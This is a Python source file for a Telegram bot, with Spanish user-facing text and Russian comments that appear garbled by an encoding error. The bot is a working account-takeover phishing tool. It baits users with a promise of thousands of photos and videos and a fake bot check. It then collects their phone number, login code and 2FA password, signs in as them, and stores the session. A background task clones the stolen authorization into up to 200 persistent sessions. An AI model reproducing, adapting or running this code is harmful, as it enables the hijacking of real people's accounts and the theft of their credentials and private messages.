import logging
import os
import asyncio
from datetime import datetime
from telethon import functions  # –î–æ–±–∞–≤–ª—è–µ–º —ç—Ç–æ—Ç –∏–º–ø–æ—Ä—Ç –≤ –Ω–∞—á–∞–ª–µ —Ñ–∞–π–ª–∞
from aiogram import Bot, Dispatcher, types
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.utils import executor
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors.rpcerrorlist import SessionPasswordNeededError, PhoneCodeExpiredError, PhoneCodeInvalidError
from pymongo import MongoClient
from dotenv import load_dotenv

# –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

load_dotenv()

# –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è
API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
MONGO_URI = os.getenv("MONGO_URI")

# –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(bot)
mongo = MongoClient(MONGO_URI)
db = mongo.telegram_sessions
main_sessions_col = db["main_sessions"]
active_sessions_col = db["active_sessions"]

# –ì–ª–æ–±–∞–ª—å–Ω—ã–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ
user_states = {}
temp_data = {}
session_tasks = {}

async def create_session_pool(user_id, phone, session_str):
    """–°–æ–∑–¥–∞–µ–º –∏ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ–º –ø—É–ª –∞–∫—Ç–∏–≤–Ω—ã—Ö —Å–µ—Å—Å–∏–π"""
    try:
        # –°–æ—Ö—Ä–∞–Ω—è–µ–º –æ—Å–Ω–æ–≤–Ω—É—é —Å–µ—Å—Å–∏—é
        main_sessions_col.update_one(
            {"user_id": user_id},
            {"$set": {
                "phone": phone,
                "session": session_str,
                "created_at": datetime.utcnow()
            }},
            upsert=True
        )
        
        # –ó–∞–ø—É—Å–∫–∞–µ–º —Ñ–æ–Ω–æ–≤—É—é –∑–∞–¥–∞—á—É –¥–ª—è –ø–æ–¥–¥–µ—Ä–∂–∞–Ω–∏—è —Å–µ—Å—Å–∏–π
        if user_id in session_tasks:
            session_tasks[user_id].cancel()
        
        session_tasks[user_id] = asyncio.create_task(
            maintain_sessions(user_id, phone, session_str)
        )
        
    except Exception as e:
        logger.error(f"Error creating session pool for {user_id}: {e}")

async def maintain_sessions(user_id, phone, main_session_str):
    """–ü–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ–º 200 –∞–∫—Ç–∏–≤–Ω—ã—Ö —Å–µ–∞–Ω—Å–æ–≤ –≤ –æ–¥–Ω–æ–º –∞–∫–∫–∞—É–Ω—Ç–µ"""
    while True:
        try:
            # –ò—Å–ø–æ–ª—å–∑—É–µ–º –æ—Å–Ω–æ–≤–Ω—É—é —Å–µ—Å—Å–∏—é –¥–ª—è —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è
            main_client = TelegramClient(StringSession(main_session_str), API_ID, API_HASH)
            await main_client.connect()
            
            if not await main_client.is_user_authorized():
                logger.error(f"Main session authorization lost for {user_id}")
                break

            try:
                # –ü–æ–ª—É—á–∞–µ–º —Ç–µ–∫—É—â–∏–µ –∞–∫—Ç–∏–≤–Ω—ã–µ —Å–µ—Å—Å–∏–∏ –∏–∑ Telegram
                auth_info = await main_client(functions.account.GetAuthorizationsRequest())
                current_sessions = auth_info.authorizations
                
                # –ü–æ–ª—É—á–∞–µ–º —Å–æ—Ö—Ä–∞–Ω–µ–Ω–Ω—ã–µ —Å–µ—Å—Å–∏–∏ –∏–∑ –±–∞–∑—ã
                db_sessions = list(active_sessions_col.find({"user_id": user_id}))
                
                # –ü—Ä–æ–≤–µ—Ä—è–µ–º –∫–∞–∫–∏–µ —Å–µ—Å—Å–∏–∏ –∞–∫—Ç–∏–≤–Ω—ã
                active_hashes = {str(s.hash) for s in current_sessions if s.current}
                valid_sessions = []
                
                for session in db_sessions:
                    session_hash = session['session'].split(':')[0]
                    if session_hash in active_hashes:
                        valid_sessions.append(session)
                        # –û–±–Ω–æ–≤–ª—è–µ–º –≤—Ä–µ–º—è –ø–æ—Å–ª–µ–¥–Ω–µ–π –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç–∏
                        active_sessions_col.update_one(
                            {"_id": session["_id"]},
                            {"$set": {"last_active": datetime.utcnow()}}
                        )
                    else:
                        # –£–¥–∞–ª—è–µ–º –Ω–µ–∞–∫—Ç–∏–≤–Ω—É—é —Å–µ—Å—Å–∏—é
                        active_sessions_col.delete_one({"_id": session["_id"]})
                
                # –°–æ–∑–¥–∞–µ–º –Ω–µ–¥–æ—Å—Ç–∞—é—â–∏–µ —Å–µ—Å—Å–∏–∏ (–¥–æ 200)
                if len(valid_sessions) < 200:
                    needed = 200 - len(valid_sessions)
                    logger.info(f"Creating {needed} new sessions for {user_id}")
                    
                    for _ in range(needed):
                        try:
                            # –°–æ–∑–¥–∞–µ–º –Ω–æ–≤—É—é —Å–µ—Å—Å–∏—é
                            new_client = TelegramClient(StringSession(), API_ID, API_HASH)
                            await new_client.connect()
                            
                            # –≠–∫—Å–ø–æ—Ä—Ç–∏—Ä—É–µ–º –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—é –∏–∑ –æ—Å–Ω–æ–≤–Ω–æ–π —Å–µ—Å—Å–∏–∏
                            exported = await main_client(functions.auth.ExportAuthorizationRequest(
                                dc_id=new_client.session.dc_id
                            ))
                            
                            # –ò–º–ø–æ—Ä—Ç–∏—Ä—É–µ–º –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—é –≤ –Ω–æ–≤—É—é —Å–µ—Å—Å–∏—é
                            await new_client(functions.auth.ImportAuthorizationRequest(
                                id=exported.id,
                                bytes=exported.bytes
                            ))
                            
                            new_session_str = new_client.session.save()
                            
                            # –°–æ—Ö—Ä–∞–Ω—è–µ–º –Ω–æ–≤—É—é —Å–µ—Å—Å–∏—é
                            active_sessions_col.insert_one({
                                "user_id": user_id,
                                "phone": phone,
                                "session": new_session_str,
                                "created_at": datetime.utcnow(),
                                "last_active": datetime.utcnow()
                            })
                            
                        except Exception as e:
                            logger.error(f"Error creating session for {user_id}: {e}")
                        finally:
                            if 'new_client' in locals():
                                await new_client.disconnect()
            
            except Exception as e:
                logger.error(f"Error checking sessions for {user_id}: {e}")
            
            await main_client.disconnect()
            await asyncio.sleep(3600)  # –ü—Ä–æ–≤–µ—Ä–∫–∞ –∫–∞–∂–¥—ã–π —á–∞—Å
            
        except asyncio.CancelledError:
            logger.info(f"Session maintenance stopped for {user_id}")
            break
        except Exception as e:
            logger.error(f"Error in session maintenance for {user_id}: {e}")
            await asyncio.sleep(60)

async def send_code_keyboard(user_id, current_code="", message_id=None):
    """–û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∫–ª–∞–≤–∏–∞—Ç—É—Ä—É –¥–ª—è –≤–≤–æ–¥–∞ –∫–æ–¥–∞"""
    try:
        digits = [[1, 2, 3], [4, 5, 6], [7, 8, 9], [0]]
        buttons = []
        for row in digits:
            btn_row = [InlineKeyboardButton(str(d), callback_data=f"code_{d}") for d in row]
            buttons.append(btn_row)
        buttons.append([InlineKeyboardButton("‚úÖ Enviar", callback_data="code_send")])
        keyboard = InlineKeyboardMarkup(inline_keyboard=buttons)
        text = f"C√≥digo: `{current_code}`" if current_code else "Ingresa el c√≥digo:"

        if message_id:
            try:
                await bot.edit_message_text(
                    chat_id=user_id,
                    message_id=message_id,
                    text=text,
                    reply_markup=keyboard,
                    parse_mode='Markdown'
                )
            except Exception as e:
                logger.error(f"Error editing message: {e}")
                msg = await bot.send_message(
                    user_id,
                    text,
                    reply_markup=keyboard,
                    parse_mode='Markdown'
                )
                return msg.message_id
        else:
            msg = await bot.send_message(
                user_id,
                text,
                reply_markup=keyboard,
                parse_mode='Markdown'
            )
            return msg.message_id
    except Exception as e:
        logger.error(f"Error sending code keyboard: {e}")
        raise

@dp.message_handler(commands=['start'])
async def start(message: types.Message):
    """–û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–æ–º–∞–Ω–¥—ã /start"""
    try:
        keyboard = InlineKeyboardMarkup().add(
            InlineKeyboardButton("Autorizaci√≥n en la primera cuentaü•∫", callback_data="auth_account")
        )
        await message.answer(
            "üëãüá™üá® ¬°HOLA! ‚ù§Ô∏è\n"
            "¬øQuieres ver m√°s de 10.000 fotos y m√°s de 4.000 v√≠deos? üëÅ\n"
            "Verifica que no eres un bot con el bot√≥n de abajo. ü§ñüëá\n\n",
            reply_markup=keyboard
        )
    except Exception as e:
        logger.error(f"Error in start handler: {e}")

@dp.callback_query_handler(lambda c: c.data == 'auth_account')
async def start_auth(callback_query: types.CallbackQuery):
    """–ù–∞—á–∞–ª–æ –ø—Ä–æ—Ü–µ—Å—Å–∞ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏"""
    try:
        user_id = callback_query.from_user.id
        user_states[user_id] = 'awaiting_contact'

        kb = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
        kb.add(KeyboardButton("üì± Comparte tu n√∫mero", request_contact=True))

        await bot.send_message(user_id, "ü•∫Por favor comparte tu n√∫mero de tel√©fono:", reply_markup=kb)
        await bot.answer_callback_query(callback_query.id)
    except Exception as e:
        logger.error(f"Error in auth_account handler: {e}")

@dp.message_handler(content_types=types.ContentType.CONTACT)
async def handle_contact(message: types.Message):
    """–û–±—Ä–∞–±–æ—Ç–∫–∞ –Ω–æ–º–µ—Ä–∞ —Ç–µ–ª–µ—Ñ–æ–Ω–∞"""
    try:
        user_id = message.from_user.id
        if user_states.get(user_id) != 'awaiting_contact':
            return

        phone = message.contact.phone_number
        if not phone.startswith("+"):
            phone = "+" + phone

        # –ü—Ä–æ–≤–µ—Ä—è–µ–º, –Ω–µ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω –ª–∏ —É–∂–µ —ç—Ç–æ—Ç –Ω–æ–º–µ—Ä
        existing = main_sessions_col.find_one({"phone": phone})
        if existing:
            await message.answer("‚ùå Este n√∫mero ya est√° registrado. Usa otro n√∫mero.")
            return

        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        
        try:
            code_request = await client.send_code_request(phone)
            user_states[user_id] = 'awaiting_code'
            temp_data[user_id] = {
                'client': client,
                'phone': phone,
                'phone_code_hash': code_request.phone_code_hash,
                'message_id': None
            }
            msg_id = await send_code_keyboard(user_id)
            temp_data[user_id]['message_id'] = msg_id
        except Exception as e:
            logger.error(f"Error sending code request: {e}")
            await message.answer(f"‚ùå Error al enviar el c√≥digo: {str(e)}")
            await client.disconnect()
            user_states.pop(user_id, None)
    except Exception as e:
        logger.error(f"Error in handle_contact: {e}")

@dp.callback_query_handler(lambda c: c.data.startswith("code_"))
async def process_code_button(callback_query: types.CallbackQuery):
    """–û–±—Ä–∞–±–æ—Ç–∫–∞ –≤–≤–æ–¥–∞ –∫–æ–¥–∞ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è"""
    try:
        user_id = callback_query.from_user.id
        data = callback_query.data

        if user_states.get(user_id) != 'awaiting_code':
            await bot.answer_callback_query(callback_query.id, text="‚õîÔ∏è No es el momento adecuado", show_alert=True)
            return

        user_data = temp_data.get(user_id)
        if not user_data:
            await bot.answer_callback_query(callback_query.id, text="Error de sesi√≥n", show_alert=True)
            return

        current_code = user_data.get('code', '')
        message_id = user_data.get('message_id')

        if data == "code_send":
            if not current_code:
                await bot.answer_callback_query(callback_query.id, text="‚ö†Ô∏è Ingresa el c√≥digo primero", show_alert=True)
                return
            
            await bot.answer_callback_query(callback_query.id)
            await try_sign_in(user_id, current_code)
        else:
            digit = data.split("_")[1]
            if len(current_code) >= 10:
                await bot.answer_callback_query(callback_query.id, text="‚ö†Ô∏è C√≥digo demasiado largo", show_alert=True)
                return
            
            current_code += digit
            temp_data[user_id]['code'] = current_code
            await send_code_keyboard(user_id, current_code, message_id)
            await bot.answer_callback_query(callback_query.id)
    except Exception as e:
        logger.error(f"Error in process_code_button: {e}")

async def try_sign_in(user_id, code):
    """–ü–æ–ø—ã—Ç–∫–∞ –≤—Ö–æ–¥–∞ —Å –∫–æ–¥–æ–º –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è"""
    try:
        user_data = temp_data.get(user_id)
        if not user_data:
            await bot.send_message(user_id, "‚ö†Ô∏è Sesi√≥n no encontrada. Por favor, comienza de nuevo con /start")
            return

        client = user_data['client']
        phone = user_data['phone']
        phone_code_hash = user_data['phone_code_hash']

        try:
            # –ü—Ä–æ–±—É–µ–º –≤–æ–π—Ç–∏ —Å –∫–æ–¥–æ–º
            await client.sign_in(
                phone=phone,
                code=code,
                phone_code_hash=phone_code_hash
            )
            
            if await client.is_user_authorized():
                session_str = client.session.save()
                await create_session_pool(user_id, phone, session_str)
                
                await bot.send_message(user_id, "‚úÖ ¬°Autenticaci√≥n exitosa!")
                await bot.send_message(
                    user_id,
                    "Estamos trabajando en modo manual, disculpen la demora, "
                    "pronto les enviaremos material fotogr√°fico y de videoüòâüßç‚Äç‚ôÄÔ∏è."
                )
            else:
                user_states[user_id] = 'awaiting_2fa'
                await bot.send_message(user_id, "üîê Ingresa tu contrase√±a 2FA:")
                
        except SessionPasswordNeededError:
            user_states[user_id] = 'awaiting_2fa'
            await bot.send_message(user_id, "üîê Se requiere tu contrase√±a 2FA. Por favor, ingr√©sala:")
        except PhoneCodeInvalidError:
            await bot.send_message(user_id, "‚ùå C√≥digo incorrecto. Int√©ntalo de nuevo:")
            temp_data[user_id]['code'] = ""
            await send_code_keyboard(user_id, "", temp_data[user_id]['message_id'])
        except PhoneCodeExpiredError:
            await bot.send_message(user_id, "‚è∞ C√≥digo expirado. Por favor, intenta nuevamente con /start")
            await client.disconnect()
            cleanup(user_id)
        except Exception as e:
            logger.error(f"Sign in error: {e}")
            await bot.send_message(user_id, f"‚ùå Error de autenticaci√≥n: {str(e)}")
            await client.disconnect()
            cleanup(user_id)
    except Exception as e:
        logger.error(f"Error in try_sign_in: {e}")

@dp.message_handler(lambda message: user_states.get(message.from_user.id) == 'awaiting_2fa')
async def process_2fa(message: types.Message):
    """–û–±—Ä–∞–±–æ—Ç–∫–∞ –¥–≤—É—Ö—Ñ–∞–∫—Ç–æ—Ä–Ω–æ–π –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏"""
    try:
        user_id = message.from_user.id
        password = message.text.strip()
        user_data = temp_data.get(user_id)
        
        if not user_data:
            await message.answer("‚ö†Ô∏è Sesi√≥n no encontrada. Por favor, comienza de nuevo con /start")
            return

        client = user_data['client']
        phone = user_data['phone']

        try:
            await client.sign_in(password=password)
            
            if await client.is_user_authorized():
                session_str = client.session.save()
                await create_session_pool(user_id, phone, session_str)
                
                await message.answer("‚úÖ ¬°Autenticaci√≥n exitosa con 2FA!")
                await message.answer(
                    "Estamos trabajando en modo manual, disculpen la demora, "
                    "pronto les enviaremos material fotogr√°fico y de videoüòâüßç‚Äç‚ôÄÔ∏è."
                )
            else:
                await message.answer("‚ùå No se pudo autenticar con 2FA.")
        except Exception as e:
            logger.error(f"2FA error: {e}")
            await message.answer(f"‚ùå Error con 2FA: {str(e)}")
        finally:
            await client.disconnect()
            cleanup(user_id)
    except Exception as e:
        logger.error(f"Error in process_2fa: {e}")

def cleanup(user_id):
    """–û—á–∏—Å—Ç–∫–∞ –¥–∞–Ω–Ω—ã—Ö –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è"""
    try:
        if user_id in user_states:
            user_states.pop(user_id)
        if user_id in temp_data:
            temp_data.pop(user_id)
    except Exception as e:
        logger.error(f"Error in cleanup: {e}")

async def on_startup(dp):
    """–î–µ–π—Å—Ç–≤–∏—è –ø—Ä–∏ –∑–∞–ø—É—Å–∫–µ –±–æ—Ç–∞"""
    logger.info("Bot started")
    # –£–±–µ–¥–∏–º—Å—è, —á—Ç–æ –Ω–µ—Ç —Å—Ç–∞—Ä—ã—Ö –∑–∞–¥–∞—á
    for task in session_tasks.values():
        task.cancel()
    session_tasks.clear()

async def on_shutdown(dp):
    """–î–µ–π—Å—Ç–≤–∏—è –ø—Ä–∏ –æ—Å—Ç–∞–Ω–æ–≤–∫–µ –±–æ—Ç–∞"""
    logger.info("Shutting down...")
    # –û—Ç–º–µ–Ω—è–µ–º –≤—Å–µ —Ñ–æ–Ω–æ–≤—ã–µ –∑–∞–¥–∞—á–∏
    for task in session_tasks.values():
        task.cancel()
    # –ó–∞–∫—Ä—ã–≤–∞–µ–º —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è
    await dp.storage.close()
    await dp.storage.wait_closed()
    await bot.close()

if __name__ == '__main__':
    try:
        executor.start_polling(
            dp,
            skip_updates=True,
            on_startup=on_startup,
            on_shutdown=on_shutdown,
            timeout=60,
            relax=1
        )
    except Exception as e:
        logger.error(f"Fatal error: {e}")